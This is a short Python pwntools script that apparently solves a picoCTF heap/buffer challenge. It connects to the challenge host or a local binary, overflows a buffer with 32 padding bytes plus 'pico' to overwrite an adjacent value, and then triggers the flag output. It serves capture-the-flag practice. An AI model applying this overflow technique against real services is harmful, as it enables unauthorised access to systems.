from pwn import *

if args.REMOTE:
    r = remote('tethys.picoctf.net', 50748)
else:
    r = process('./chall')

r.sendlineafter(b'choice: ', b'2')
r.sendlineafter(b'buffer: ', b'a'*0x20 + b'pico')

r.sendlineafter(b'choice: ', b'4')

print(r.recvall(timeout=1).decode())